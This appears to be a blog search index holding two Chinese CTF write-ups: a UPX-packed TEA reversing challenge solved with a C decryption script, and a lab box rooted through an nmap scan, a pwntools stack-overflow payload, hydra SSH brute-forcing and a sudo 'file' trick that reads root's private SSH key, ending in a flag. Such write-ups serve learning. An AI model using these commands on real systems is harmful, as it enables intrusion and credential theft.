<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>喝茶歇歇</title>
      <link href="/2025/12/22/%E5%8E%9F%E5%88%9B_%E5%96%9D%E8%8C%B6%E6%AD%87%E6%AD%87/"/>
      <url>/2025/12/22/%E5%8E%9F%E5%88%9B_%E5%96%9D%E8%8C%B6%E6%AD%87%E6%AD%87/</url>
      
        <content type="html"><![CDATA[<p>题目下载：<a href="https://customize-reverse.oss-cn-beijing.aliyuncs.com/%E5%96%9D%E8%8C%B6%E6%AD%87%E6%AD%87.exe">点击下载喝茶歇歇.exe</a></p><p>首先用upx进行脱壳处理</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251208111046433.png" alt="image-20251208111046433"></p><p>再进入主函数部分可以看到key部分和加密函数部分</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251208105648560.png" alt="image-20251208105648560"></p><p>但是值得注意的是最后两个加密数组</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251222085039682.png" alt="image-20251222085039682"></p><p>转化成16进制就是0x4e,0x2a</p><p>双击encrypt_string找到加密函数</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251208110019231.png" alt="image-20251208110019231"></p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251208110129066.png" alt="image-20251208110129066"></p><p>于是编写解密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">void __fastcall decrypt(uint32_t* v, uint32_t* k)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v0 = v[0];</span><br><span class="line">    uint32_t v1 = v[1];</span><br><span class="line">    uint32_t sum = 0x0D33B470 * 32; // delta * rounds = 0x0D33B470 * 32</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 32; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= (k[3] + (v0 &gt;&gt; 5)) ^ (sum + v0) ^ (k[2] + 16 * v0);</span><br><span class="line">        v0 -= (k[1] + (v1 &gt;&gt; 5)) ^ (sum + v1) ^ (k[0] + 16 * v1);</span><br><span class="line">        sum -= 0x0D33B470;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[0] = v0;</span><br><span class="line">    v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    uint32_t k[4] = &#123; 0x12345678, 0x9ABCDEF0, 0x87654321, 0x0FEDCBA9 &#125;;</span><br><span class="line"></span><br><span class="line">    // 密文（40字节）</span><br><span class="line">    uint8_t input[40] = &#123;</span><br><span class="line">        0x65, 0x92, 0x1B, 0xAD, 0x88, 0xC1, 0x20, 0x01,</span><br><span class="line">        0xFE, 0x7D, 0x62, 0xCA, 0xF0, 0x26, 0x4A, 0x54,</span><br><span class="line">        0xAE, 0x21, 0x01, 0xCE, 0xF1, 0x90, 0xD9, 0x9F,</span><br><span class="line">        0x79, 0xDC, 0x49, 0xA3, 0xF2, 0x7B, 0xC8, 0x88,</span><br><span class="line">        0xC1, 0xF1, 0xCC, 0xB2, 0x54, 0x11, 0x4E, 0x2A</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 40; i += 8) &#123;</span><br><span class="line">        uint32_t v[2];</span><br><span class="line">        // 小端序组装每 8 字节</span><br><span class="line">        v[0] = input[i] | (input[i + 1] &lt;&lt; 8) | (input[i + 2] &lt;&lt; 16) | (input[i + 3] &lt;&lt; 24);</span><br><span class="line">        v[1] = input[i + 4] | (input[i + 5] &lt;&lt; 8) | (input[i + 6] &lt;&lt; 16) | (input[i + 7] &lt;&lt; 24);</span><br><span class="line"></span><br><span class="line">        // 调用解密函数</span><br><span class="line">        decrypt(v, k);</span><br><span class="line"></span><br><span class="line">        // 小端序输出每个字节</span><br><span class="line">        for (int j = 0; j &lt; 2; j++) &#123;</span><br><span class="line">            printf(&quot;%c%c%c%c&quot;,</span><br><span class="line">                (v[j] &amp; 0xFF),</span><br><span class="line">                ((v[j] &gt;&gt; 8) &amp; 0xFF),</span><br><span class="line">                ((v[j] &gt;&gt; 16) &amp; 0xFF),</span><br><span class="line">                ((v[j] &gt;&gt; 24) &amp; 0xFF)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tea加密，逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezpwn_提权处理</title>
      <link href="/2025/12/18/ezpwn-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/"/>
      <url>/2025/12/18/ezpwn-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>首先扫描端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -p- 192.168.43.100</span><br></pre></td></tr></table></figure><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217172308957.png" alt="image-20251217172308957"></p><p>发现开了一个6538的端口</p><p>下载overflow文件并用idapro打开</p><p>用f5查看伪代码并进入start里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl start()</span><br><span class="line">&#123;</span><br><span class="line">  char a[12]; // [rsp+Fh] [rbp-11h] BYREF</span><br><span class="line">  char c[2]; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  char b[3]; // [rsp+1Dh] [rbp-3h]</span><br><span class="line"></span><br><span class="line">  gets(a);  //当输入长度超过a的大小时会溢出覆盖c和b的内存</span><br><span class="line">  if ( b[1] == 115 &amp;&amp; c[1] == 112 )</span><br><span class="line">    port();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们利用栈溢出漏洞来写一个pwn脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">proc = remote(&#x27;192.168.43.100&#x27;, 9999)</span><br><span class="line"># 构造 payload：</span><br><span class="line"># a[12] + 填充到c[1]的位置 + &#x27;p&#x27; + 填充到b[1]的位置 + &#x27;s&#x27;</span><br><span class="line">offset_to_c1 = 12 + 1  # a[12]后第1个字节是c[1]</span><br><span class="line">offset_to_b1 = 12 + 2 + 1  # a[12] + c[2]后第1个字节是b[1]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * 12  # 填满a[12]</span><br><span class="line">payload += b&#x27;X&#x27; * 1  # 填充到c[1]的位置</span><br><span class="line">payload += b&#x27;p&#x27;      # 设置c[1] = &#x27;p&#x27; (ASCII 112)</span><br><span class="line">payload += b&#x27;Y&#x27; * 1  # 填充到b[1]的位置</span><br><span class="line">payload += b&#x27;s&#x27;      # 设置b[1] = &#x27;s&#x27; (ASCII 115)</span><br><span class="line"></span><br><span class="line"># 发送payload</span><br><span class="line">proc.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 交互（查看程序输出或进一步操作）</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure><p>运行完后告诉我们开了一个新的窗口</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171837213.png" alt="image-20251217171837213"></p><p>所以我们再用nmap来进行扫一遍</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171856297.png" alt="image-20251217171856297"></p><p>发现新开了一个11450端口 </p><p>将两个文件下载后  再次用idapro打开ret2text</p><p>由hint提示可知密码就是偏移量</p><p>因为home下面的肯定是用户名即a</p><p>用python生成一个密码本（先尝试0x0~0x1000爆破）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l a -P /home/kali/Desktop/a.txt 192.168</span><br><span class="line">.1.167 ssh</span><br></pre></td></tr></table></figure><p>爆破得知密码为0x12</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171910648.png" alt="image-20251217171910648"></p><p>接着用ssh连接</p><p>拿到user</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171921163.png" alt="image-20251217171921163"></p><p>下一步就是提权拿到root</p><p>用 sudo -l 列出允许用户可以使用的命令</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171934178.png" alt="image-20251217171934178"></p><p>发现里面有一个file文件<a href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%B8%8B%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2file%E7%9A%84%E5%85%B7%E4%BD%93%E7%94%A8%E6%B3%95">https://gtfobins.github.io/在这个网站下可以搜索file的具体用法</a></p><p>我们用sudo file -f &#x2F;root&#x2F;.ssh&#x2F;id_rsa下查看它的私钥</p><p>接着用xterminal进行ssh连接</p><p>就可以找到在root文件下有个rt.txt文件  root的flag就藏在着</p><p>flag{4z_pW’_r;o1t}</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> SSH爆破 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
